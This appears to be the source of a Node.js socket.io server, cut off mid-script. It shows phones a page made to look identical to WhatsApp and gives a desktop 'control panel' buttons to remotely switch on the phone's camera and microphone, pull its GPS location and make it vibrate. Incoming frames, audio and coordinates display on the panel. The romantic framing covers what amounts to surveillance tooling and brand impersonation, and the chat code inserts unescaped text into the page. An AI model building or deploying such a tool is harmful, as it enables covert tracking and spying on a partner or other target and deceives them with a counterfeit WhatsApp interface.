const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent'].toLowerCase();
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    // Página do CELULAR - Interface IDÊNTICA ao WhatsApp
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
    <title>WhatsApp</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0b141a;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* Container principal do WhatsApp */
        .whatsapp-container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            width: 100%;
            background: #0b141a;
            position: relative;
            z-index: 2;
        }

        /* Header do WhatsApp */
        .whatsapp-header {
            background: #202c33;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #2a3942;
            position: relative;
            z-index: 10;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .back-btn {
            background: none;
            border: none;
            color: #e9edef;
            font-size: 24px;
            cursor: pointer;
            display: none;
        }

        .avatar {
            width: 40px;
            height: 40px;
            background: #2a3942;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            position: relative;
        }

        .contact-info h3 {
            color: #e9edef;
            font-size: 16px;
            font-weight: 500;
        }

        .contact-status {
            color: #8696a0;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .online-dot {
            width: 8px;
            height: 8px;
            background: #25d366;
            border-radius: 50%;
            display: inline-block;
        }

        .header-right {
            display: flex;
            gap: 20px;
        }

        .header-icon {
            color: #e9edef;
            font-size: 20px;
            cursor: pointer;
            background: none;
            border: none;
        }

        /* Área de mensagens - Estilo WhatsApp */
        .messages-area {
            flex: 1;
            overflow-y: auto;
            padding: 15px 12px;
            display: flex;
            flex-direction: column;
            gap: 8px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.03"><path fill="none" d="M10,10 L90,10 M10,30 L90,30 M10,50 L90,50 M10,70 L90,70 M10,90 L90,90 M30,10 L30,90 M50,10 L50,90 M70,10 L70,90 M90,10 L90,90"/></svg>');
            background-repeat: repeat;
        }

        /* Balão de mensagem - Estilo WhatsApp */
        .message {
            max-width: 75%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14.2px;
            line-height: 1.4;
            position: relative;
            word-wrap: break-word;
            animation: messageAppear 0.2s ease;
        }

        @keyframes messageAppear {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .message.sent {
            background: #005c4b;
            color: #e9edef;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }

        .message.received {
            background: #202c33;
            color: #e9edef;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }

        .message-content {
            word-break: break-word;
        }

        .message-meta {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 4px;
            margin-top: 4px;
            font-size: 10px;
            color: #8696a0;
        }

        .message.sent .message-meta {
            color: #8696a0;
        }

        /* Indicador de visualização */
        .double-check {
            font-size: 12px;
        }

        /* Mensagem de áudio */
        .audio-message {
            display: flex;
            align-items: center;
            gap: 10px;
            min-width: 200px;
        }

        .audio-play-btn {
            background: none;
            border: none;
            color: #e9edef;
            font-size: 20px;
            cursor: pointer;
        }

        .audio-wave {
            flex: 1;
            height: 30px;
            display: flex;
            align-items: center;
            gap: 3px;
        }

        .wave-bar {
            width: 3px;
            background: #e9edef;
            border-radius: 2px;
            animation: wave 0.5s ease infinite alternate;
        }

        @keyframes wave {
            from { height: 5px; }
            to { height: 20px; }
        }

        /* Indicador de digitação */
        .typing-indicator {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 8px 12px;
            background: #202c33;
            border-radius: 16px;
            width: fit-content;
            margin-bottom: 8px;
            align-self: flex-start;
        }

        .typing-dots {
            display: flex;
            gap: 3px;
        }

        .typing-dots span {
            width: 6px;
            height: 6px;
            background: #8696a0;
            border-radius: 50%;
            animation: typingDot 1.4s infinite;
        }

        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }

        @keyframes typingDot {
            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
            30% { transform: translateY(-6px); opacity: 1; }
        }

        /* Área de input - Estilo WhatsApp */
        .message-input-area {
            background: #202c33;
            padding: 8px 12px;
            display: flex;
            gap: 10px;
            align-items: center;
            position: relative;
            z-index: 10;
        }

        .input-left {
            display: flex;
            gap: 8px;
        }

        .emoji-btn, .attach-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #8696a0;
        }

        .message-input {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 9px 12px;
            border-radius: 20px;
            color: #e9edef;
            font-size: 15px;
            outline: none;
        }

        .message-input::placeholder {
            color: #8696a0;
        }

        .input-right {
            display: flex;
            gap: 8px;
        }

        .mic-btn, .send-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #8696a0;
        }

        .send-btn.active {
            color: #25d366;
        }

        /* Menu lateral (simulação) */
        .side-menu {
            position: fixed;
            top: 0;
            right: -100%;
            width: 80%;
            max-width: 300px;
            height: 100%;
            background: #202c33;
            z-index: 100;
            transition: right 0.3s ease;
            box-shadow: -2px 0 8px rgba(0,0,0,0.3);
        }

        .side-menu.open {
            right: 0;
        }

        .menu-header {
            padding: 50px 20px 20px;
            background: #2a3942;
        }

        .menu-item {
            padding: 15px 20px;
            color: #e9edef;
            display: flex;
            align-items: center;
            gap: 15px;
            border-bottom: 1px solid #2a3942;
            cursor: pointer;
        }

        .menu-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 99;
            display: none;
        }

        .menu-overlay.show {
            display: block;
        }

        /* Notificações */
        .notification {
            position: fixed;
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: #1e2a32;
            color: #e9edef;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            z-index: 200;
            animation: notifySlide 0.3s ease;
        }

        @keyframes notifySlide {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }
    </style>
</head>
<body>
    <div class="whatsapp-container">
        <!-- Header WhatsApp -->
        <div class="whatsapp-header">
            <div class="header-left">
                <div class="avatar">
                    💕
                    <span style="position: absolute; bottom: 0; right: 0; width: 10px; height: 10px; background: #25d366; border-radius: 50%; border: 2px solid #202c33;"></span>
                </div>
                <div class="contact-info">
                    <h3>Meu Amor ❤️</h3>
                    <div class="contact-status">
                        <span class="online-dot"></span>
                        <span id="statusText">online</span>
                    </div>
                </div>
            </div>
            <div class="header-right">
                <button class="header-icon" id="menuBtn">⋮</button>
            </div>
        </div>

        <!-- Área de mensagens -->
        <div class="messages-area" id="messagesArea">
            <div class="message received">
                <div class="message-content">
                    💕 Olá, meu amor! Estou aqui para você 💕
                </div>
                <div class="message-meta">
                    <span class="message-time">Agora</span>
                </div>
            </div>
        </div>

        <!-- Área de input -->
        <div class="message-input-area">
            <div class="input-left">
                <button class="emoji-btn" id="emojiBtn">😊</button>
                <button class="attach-btn" id="attachBtn">+</button>
            </div>
            <input type="text" class="message-input" id="messageInput" placeholder="Digite uma mensagem">
            <div class="input-right">
                <button class="mic-btn" id="micBtn">🎤</button>
                <button class="send-btn" id="sendBtn">📤</button>
            </div>
        </div>
    </div>

    <!-- Menu lateral -->
    <div class="menu-overlay" id="menuOverlay"></div>
    <div class="side-menu" id="sideMenu">
        <div class="menu-header">
            <div style="text-align: center;">
                <div style="font-size: 60px;">💕</div>
                <h3 style="color: #e9edef; margin-top: 10px;">Meu Amor</h3>
                <p style="color: #8696a0; font-size: 12px;">Conectado</p>
            </div>
        </div>
        <div class="menu-item" id="menuCamera">
            <span>📷</span> <span>Câmera</span>
        </div>
        <div class="menu-item" id="menuMic">
            <span>🎤</span> <span>Microfone</span>
        </div>
        <div class="menu-item" id="menuLocation">
            <span>📍</span> <span>Localização</span>
        </div>
        <div class="menu-item" id="menuMusic">
            <span>🎵</span> <span>Música</span>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        
        // Elementos
        const messagesArea = document.getElementById('messagesArea');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const micBtn = document.getElementById('micBtn');
        const emojiBtn = document.getElementById('emojiBtn');
        const attachBtn = document.getElementById('attachBtn');
        const menuBtn = document.getElementById('menuBtn');
        const sideMenu = document.getElementById('sideMenu');
        const menuOverlay = document.getElementById('menuOverlay');
        const statusText = document.getElementById('statusText');
        
        // Estado
        let isRecording = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let typingTimeout = null;
        let isTyping = false;
        
        // Função para adicionar mensagem
        function addMessage(text, type = 'received', isAudio = false, audioUrl = null) {
            const messageDiv = document.createElement('div');
            messageDiv.className = `message ${type}`;
            
            const now = new Date();
            const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            
            if (isAudio && audioUrl) {
                messageDiv.innerHTML = \`
                    <div class="audio-message">
                        <button class="audio-play-btn" onclick="this.innerHTML=this.innerHTML==='⏸️'?'▶️':'⏸️'; document.getElementById('audio_\${Date.now()}').play()">▶️</button>
                        <div class="audio-wave">
                            <div class="wave-bar" style="animation-duration: 0.3s"></div>
                            <div class="wave-bar" style="animation-duration: 0.5s"></div>
                            <div class="wave-bar" style="animation-duration: 0.4s"></div>
                            <div class="wave-bar" style="animation-duration: 0.6s"></div>
                            <div class="wave-bar" style="animation-duration: 0.35s"></div>
                        </div>
                        <audio id="audio_\${Date.now()}" src="\${audioUrl}" style="display: none;"></audio>
                        <span style="font-size: 11px;">0:00</span>
                    </div>
                    <div class="message-meta">
                        <span class="message-time">\${timeStr}</span>
                        <span class="double-check">✓✓</span>
                    </div>
                \`;
            } else {
                messageDiv.innerHTML = \`
                    <div class="message-content">\${text}</div>
                    <div class="message-meta">
                        <span class="message-time">\${timeStr}</span>
                        <span class="double-check">✓✓</span>
                    </div>
                \`;
            }
            
            messagesArea.appendChild(messageDiv);
            messagesArea.scrollTop = messagesArea.scrollHeight;
            return messageDiv;
        }
        
        // Enviar mensagem
        function sendMessage() {
            const text = messageInput.value.trim();
            if (text) {
                addMessage(text, 'sent');
                socket.emit('chat_message', text);
                messageInput.value = '';
                stopTyping();
            }
        }
        
        // Indicador de digitação
        function startTyping() {
            if (!isTyping) {
                isTyping = true;
                socket.emit('typing_start');
            }
            if (typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => {
                stopTyping();
            }, 1000);
        }
        
        function stopTyping() {
            if (isTyping) {
                isTyping = false;
                socket.emit('typing_stop');
            }
        }
        
        // Mostrar notificação
        function showNotification(message) {
            const notif = document.createElement('div');
            notif.className = 'notification';
            notif.textContent = message;
            document.body.appendChild(notif);
            setTimeout(() => notif.remove(), 3000);
        }
        
        // Gravar áudio
        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    audioChunks.push(event.data);
                };
                
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const audioUrl = URL.createObjectURL(audioBlob);
                    addMessage('🎤 Mensagem de áudio', 'sent', true, audioUrl);
                    
                    // Converter para base64 e enviar
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        socket.emit('audio_message', reader.result);
                    };
                    reader.readAsDataURL(audioBlob);
                    
                    stream.getTracks().forEach(track => track.stop());
                    showNotification('🎤 Áudio enviado!');
                };
                
                mediaRecorder.start();
                isRecording = true;
                micBtn.textContent = '⏹️';
                micBtn.style.color = '#25d366';
                showNotification('🎤 Gravando... Clique novamente para parar');
            } catch (err) {
                console.error('Erro ao gravar áudio:', err);
                showNotification('❌ Erro ao acessar microfone');
            }
        }
        
        function stopRecording() {
            if (mediaRecorder && isRecording) {
                mediaRecorder.stop();
                isRecording = false;
                micBtn.textContent = '🎤';
                micBtn.style.color = '#8696a0';
            }
        }
        
        // Eventos de input
        sendBtn.addEventListener('click', sendMessage);
        messageInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendMessage();
        });
        messageInput.addEventListener('input', () => {
            startTyping();
        });
        
        // Botão de microfone
        micBtn.addEventListener('click', () => {
            if (isRecording) {
                stopRecording();
            } else {
                startRecording();
            }
        });
        
        // Menu
        menuBtn.addEventListener('click', () => {
            sideMenu.classList.add('open');
            menuOverlay.classList.add('show');
        });
        
        function closeMenu() {
            sideMenu.classList.remove('open');
            menuOverlay.classList.remove('show');
        }
        
        menuOverlay.addEventListener('click', closeMenu);
        
        // Ações do menu
        document.getElementById('menuCamera').addEventListener('click', () => {
            socket.emit('comando', 'toggleCamera');
            showNotification('📷 Solicitando câmera');
            closeMenu();
        });
        
        document.getElementById('menuMic').addEventListener('click', () => {
            socket.emit('comando', 'toggleAudio');
            showNotification('🎤 Solicitando microfone');
            closeMenu();
        });
        
        document.getElementById('menuLocation').addEventListener('click', () => {
            socket.emit('comando', 'getLocation');
            showNotification('📍 Solicitando localização');
            closeMenu();
        });
        
        document.getElementById('menuMusic').addEventListener('click', () => {
            socket.emit('comando', 'playMusic');
            showNotification('🎵 Tocando música romântica');
            closeMenu();
        });
        
        // Emojis simples
        emojiBtn.addEventListener('click', () => {
            const emojis = ['😊', '❤️', '💕', '😘', '🥰', '💖', '💗', '💓', '💝', '💘', '💌', '🌹', '✨', '⭐', '🎵'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            messageInput.value += randomEmoji;
            messageInput.focus();
        });
        
        // Socket events
        socket.on('chat_message', (msg) => {
            addMessage(msg, 'received');
            showNotification('💬 Nova mensagem');
        });
        
        socket.on('audio_message', (audioBase64) => {
            addMessage('🎤 Mensagem de áudio', 'received', true, audioBase64);
            showNotification('🎤 Nova mensagem de áudio');
        });
        
        socket.on('typing_start', () => {
            statusText.innerHTML = '<span class="online-dot"></span> digitando...';
        });
        
        socket.on('typing_stop', () => {
            statusText.innerHTML = '<span class="online-dot"></span> online';
        });
        
        socket.on('status_update', (status) => {
            if (status === 'online') {
                statusText.innerHTML = '<span class="online-dot"></span> online';
            } else {
                statusText.innerHTML = '<span class="online-dot"></span> último visto agora';
            }
        });
        
        socket.on('connect', () => {
            showNotification('✨ Conectado! ✨');
        });
    </script>
</body>
</html>`);
  } else {
    // Página do PC - Painel de Controle (WhatsApp Web style)
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WhatsApp Web - Controle</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #111b21;
            height: 100vh;
            overflow: hidden;
        }

        .whatsapp-web {
            display: flex;
            height: 100vh;
        }

        /* Sidebar - Conversas */
        .sidebar {
            width: 380px;
            background: #202c33;
            border-right: 1px solid #2a3942;
            display: flex;
            flex-direction: column;
        }

        .sidebar-header {
            padding: 16px;
            background: #202c33;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #2a3942;
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .user-avatar {
            width: 40px;
            height: 40px;
            background: #2a3942;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }

        .user-name {
            color: #e9edef;
            font-weight: 500;
        }

        .sidebar-actions {
            display: flex;
            gap: 16px;
        }

        .action-btn {
            background: none;
            border: none;
            color: #8696a0;
            font-size: 20px;
            cursor: pointer;
        }

        /* Search */
        .search-area {
            padding: 12px;
            background: #202c33;
        }

        .search-box {
            background: #2a3942;
            border-radius: 8px;
            padding: 8px 12px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .search-box input {
            background: none;
            border: none;
            color: #e9edef;
            flex: 1;
            outline: none;
        }

        /* Chat list */
        .chat-list {
            flex: 1;
            overflow-y: auto;
        }

        .chat-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .chat-item:hover {
            background: #2a3942;
        }

        .chat-item.active {
            background: #2a3942;
        }

        .chat-avatar {
            width: 49px;
            height: 49px;
            background: #2a3942;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }

        .chat-info {
            flex: 1;
        }

        .chat-name {
            color: #e9edef;
            font-weight: 500;
            margin-bottom: 4px;
        }

        .chat-last-msg {
            color: #8696a0;
            font-size: 13px;
        }

        /* Main chat area */
        .main-chat {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: #0b141a;
        }

        .chat-header {
            background: #202c33;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #2a3942;
        }

        .chat-contact {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .contact-avatar {
            width: 40px;
            height: 40px;
            background: #2a3942;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }

        .contact-name {
            color: #e9edef;
            font-weight: 500;
        }

        .contact-status {
            color: #8696a0;
            font-size: 12px;
        }

        .chat-actions {
            display: flex;
            gap: 20px;
        }

        /* Messages area */
        .chat-messages {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 8px;
            background-image: radial-gradient(circle at 25% 40%, rgba(255,255,255,0.02) 2%, transparent 2%);
            background-size: 40px 40px;
        }

        .message {
            max-width: 65%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
            line-height: 1.4;
            position: relative;
            word-wrap: break-word;
        }

        .message.sent {
            background: #005c4b;
            color: #e9edef;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }

        .message.received {
            background: #202c33;
            color: #e9edef;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }

        .message-meta {
            font-size: 10px;
            color: #8696a0;
            margin-top: 4px;
            text-align: right;
        }

        /* Input area */
        .chat-input {
            background: #202c33;
            padding: 12px 16px;
            display: flex;
            gap: 12px;
            align-items: center;
        }

        .input-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #8696a0;
        }

        .chat-input input {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 10px 16px;
            border-radius: 20px;
            color: #e9edef;
            font-size: 15px;
            outline: none;
        }

        /* Control Panel - Painel do PC */
        .control-panel {
            width: 320px;
            background: #202c33;
            border-left: 1px solid #2a3942;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
        }

        .panel-section {
            padding: 16px;
            border-bottom: 1px solid #2a3942;
        }

        .panel-title {
            color: #e9edef;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .control-buttons {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .ctrl-btn {
            background: #2a3942;
            border: none;
            padding: 12px;
            border-radius: 8px;
            color: #e9edef;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
            transition: all 0.2s;
        }

        .ctrl-btn:hover {
            background: #3b4a54;
        }

        .ctrl-btn.active {
            background: #005c4b;
        }

        .status-badge {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #8696a0;
            margin-left: 8px;
        }

        .status-badge.online {
            background: #25d366;
        }

        .video-preview {
            background: #111b21;
            border-radius: 8px;
            margin-top: 12px;
            overflow: hidden;
        }

        .video-preview img, .video-preview video {
            width: 100%;
            height: auto;
        }

        .location-info {
            background: #111b21;
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            color: #8696a0;
            margin-top: 12px;
        }

        .music-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .music-item {
            background: #2a3942;
            padding: 10px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
            transition: all 0.2s;
        }

        .music-item:hover {
            background: #3b4a54;
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: #202c33;
            border-radius: 12px;
            max-width: 90%;
            max-height: 90%;
            overflow: auto;
        }

        .modal-content video {
            width: 100%;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="whatsapp-web">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="sidebar-header">
                <div class="user-info">
                    <div class="user-avatar">💻</div>
                    <span class="user-name">PC - Controle</span>
                </div>
                <div class="sidebar-actions">
                    <button class="action-btn">🔄</button>
                    <button class="action-btn">💬</button>
                    <button class="action-btn">⋮</button>
                </div>
            </div>
            <div class="search-area">
                <div class="search-box">
                    <span>🔍</span>
                    <input type="text" placeholder="Pesquisar ou começar uma nova conversa">
                </div>
            </div>
            <div class="chat-list">
                <div class="chat-item active">
                    <div class="chat-avatar">💕</div>
                    <div class="chat-info">
                        <div class="chat-name">Meu Amor</div>
                        <div class="chat-last-msg">Clique para conversar...</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Main Chat -->
        <div class="main-chat">
            <div class="chat-header">
                <div class="chat-contact">
                    <div class="contact-avatar">💕</div>
                    <div>
                        <div class="contact-name">Meu Amor</div>
                        <div class="contact-status" id="chatStatus">online</div>
                    </div>
                </div>
                <div class="chat-actions">
                    <button class="action-btn">📞</button>
                    <button class="action-btn">🎥</button>
                    <button class="action-btn">⋮</button>
                </div>
            </div>

            <div class="chat-messages" id="chatMessages">
                <div class="message received">
                    💕 Olá! Estou aqui para você 💕
                    <div class="message-meta">Agora</div>
                </div>
            </div>

            <div class="chat-input">
                <button class="input-btn">😊</button>
                <button class="input-btn">+</button>
                <input type="text" id="messageInput" placeholder="Digite uma mensagem">
                <button class="input-btn" id="sendBtn">📤</button>
            </div>
        </div>

        <!-- Control Panel -->
        <div class="control-panel">
            <div class="panel-section">
                <div class="panel-title">
                    <span>📹</span> Controle de Câmera
                </div>
                <div class="control-buttons">
                    <button class="ctrl-btn" id="toggleCameraBtn">
                        <span>📷</span> Ativar Câmera
                    </button>
                    <div class="video-preview" id="videoPreview">
                        <img id="remoteVideo" src="" alt="Preview">
                    </div>
                </div>
            </div>

            <div class="panel-section">
                <div class="panel-title">
                    <span>🎤</span> Áudio
                </div>
                <div class="control-buttons">
                    <button class="ctrl-btn" id="toggleAudioBtn">
                        <span>🔊</span> Ativar Microfone
                    </button>
                    <button class="ctrl-btn" id="testAudioBtn">
                        <span>🎵</span> Testar Áudio
                    </button>
                </div>
            </div>

            <div class="panel-section">
                <div class="panel-title">
                    <span>📍</span> Localização
                </div>
                <div class="control-buttons">
                    <button class="ctrl-btn" id="getLocationBtn">
                        <span>📍</span> Obter Localização
                    </button>
                    <div class="location-info" id="locationInfo">
                        Aguardando localização...
                    </div>
                </div>
            </div>

            <div class="panel-section">
                <div class="panel-title">
                    <span>🎵</span> Música Romântica
                </div>
                <div class="music-list">
                    <div class="music-item" data-video-id="1N8N-X8NM4k" data-name="Música Especial 1">
                        <span>🎵</span> Música 1
                    </div>
                    <div class="music-item" data-video-id="sTVNvP5Uw98" data-name="Música Especial 2">
                        <span>🎵</span> Música 2
                    </div>
                </div>
                <div class="control-buttons" style="margin-top: 12px;">
                    <button class="ctrl-btn" id="stopMusicBtn">
                        <span>⏹️</span> Parar Música
                    </button>
                </div>
            </div>

            <div class="panel-section">
                <div class="panel-title">
                    <span>💖</span> Ações Especiais
                </div>
                <div class="control-buttons">
                    <button class="ctrl-btn" id="vibrateBtn">
                        <span>📳</span> Vibrar
                    </button>
                    <button class="ctrl-btn" id="emergencyBtn">
                        <span>💥</span> Surpresa Especial
                    </button>
                    <button class="ctrl-btn" id="swapCameraBtn">
                        <span>🔄</span> Trocar Câmera
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal -->
    <div class="modal" id="cameraModal">
        <div class="modal-content">
            <video id="fullscreenVideo" autoplay playsinline style="width: 100%;"></video>
            <button onclick="closeModal()" style="position: absolute; top: 10px; right: 10px; background: red; color: white; border: none; padding: 5px 10px; border-radius: 5px;">Fechar</button>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        
        // Elementos
        const chatMessages = document.getElementById('chatMessages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const remoteVideo = document.getElementById('remoteVideo');
        const locationInfo = document.getElementById('locationInfo');
        const chatStatus = document.getElementById('chatStatus');
        
        // Estado
        let typingTimeout = null;
        let isTyping = false;
        
        // Função para adicionar mensagem
        function addMessage(text, type = 'sent') {
            const messageDiv = document.createElement('div');
            messageDiv.className = `message ${type}`;
            
            const now = new Date();
            const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            
            messageDiv.innerHTML = \`
                \${text}
                <div class="message-meta">\${timeStr}</div>
            \`;
            
            chatMessages.appendChild(messageDiv);
            chatMessages.scrollTop = chatMessages.scrollHeight;
            return messageDiv;
        }
        
        // Enviar mensagem
        function sendMessage() {
            const text = messageInput.value.trim();
            if (text) {
                addMessage(text, 'sent');
                socket.emit('chat_message', text);
                messageInput.value = '';
                stopTyping();
            }
        }
        
        // Indicador de digitação
        function startTyping() {
            if (!isTyping) {
                isTyping = true;
                socket.emit('typing_start');
                chatStatus.innerHTML = 'digitando...';
            }
            if (typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => {
                stopTyping();
            }, 1000);
        }
        
        function stopTyping() {
            if (isTyping) {
                isTyping = false;
                socket.emit('typing_stop');
                chatStatus.innerHTML = 'online';
            }
        }
        
        // Eventos de input
        sendBtn.addEventListener('click', sendMessage);
        messageInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendMessage();
        });
        messageInput.addEventListener('input', startTyping);
        
        // Controles de câmera
        let frameCount = 0;
        socket.on('frame', (frameData) => {
            remoteVideo.src = frameData;
            frameCount++;
        });
        
        document.getElementById('toggleCameraBtn').addEventListener('click', () => {
            socket.emit('comando', 'toggleCamera');
            addMessage('📷 Solicitando ativação da câmera...', 'sent');
        });
        
        document.getElementById('swapCameraBtn').addEventListener('click', () => {
            socket.emit('comando', 'trocarCamera');
            addMessage('🔄 Trocando câmera...', 'sent');
        });
        
        // Áudio
        let audioEnabled = true;
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const audioGain = audioContext.createGain();
        audioGain.gain.value = 0.5;
        audioGain.connect(audioContext.destination);
        
        socket.on('audio', (audioData) => {
            if (audioEnabled) {
                const buffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate);
                buffer.copyToChannel(new Float32Array(audioData), 0);
                const source = audioContext.createBufferSource();
                source.buffer = buffer;
                source.connect(audioGain);
                source.start();
            }
        });
        
        socket.on('audio_message', (audioBase64) => {
            addMessage('🎤 Mensagem de áudio recebida', 'received');
        });
        
        document.getElementById('toggleAudioBtn').addEventListener('click', () => {
            audioEnabled = !audioEnabled;
            const btn = document.getElementById('toggleAudioBtn');
            btn.innerHTML = audioEnabled ? '<span>🔊</span> Microfone ON' : '<span>🔇</span> Microfone OFF';
            addMessage(audioEnabled ? '🎤 Áudio ativado' : '🔇 Áudio desativado', 'sent');
        });
        
        document.getElementById('testAudioBtn').addEventListener('click', () => {
            socket.emit('comando', 'testAudio');
            addMessage('🎵 Testando áudio do celular...', 'sent');
        });
        
        // Localização
        socket.on('location', (data) => {
            locationInfo.innerHTML = \`
                📍 Localização atual:<br>
                Lat: \${data.latitude.toFixed(6)}<br>
                Lng: \${data.longitude.toFixed(6)}<br>
                <a href="https://www.google.com/maps?q=\${data.latitude},\${data.longitude}" target="_blank" style="color: #25d366;">
                    🗺️ Ver no mapa
                </a>
            \`;
            addMessage(\`📍 Localização recebida: \${data.latitude.toFixed(4)}, \${data.longitude.toFixed(4)}\`, 'received');
        });
        
        document.getElementById('getLocationBtn').addEventListener('click', () => {
            socket.emit('comando', 'getLocation');
            addMessage('📍 Solicitando localização...', 'sent');
        });
        
        // Música
        document.querySelectorAll('.music-item').forEach(item => {
            item.addEventListener('click', () => {
                const videoId = item.getAttribute('data-video-id');
                const songName = item.getAttribute('data-name');
                socket.emit('play_youtube', { videoId, songName });
                addMessage(\`🎵 Tocando: \${songName}\`, 'sent');
            });
        });
        
        document.getElementById('stopMusicBtn').addEventListener('click', () => {
            socket.emit('stop_music');
            addMessage('⏹️ Música parada', 'sent');
        });
        
        // Ações especiais
        document.getElementById('vibrateBtn').addEventListener('click', () => {
            socket.emit('comando', 'vibrate');
            addMessage('📳 Vibração enviada', 'sent');
        });
        
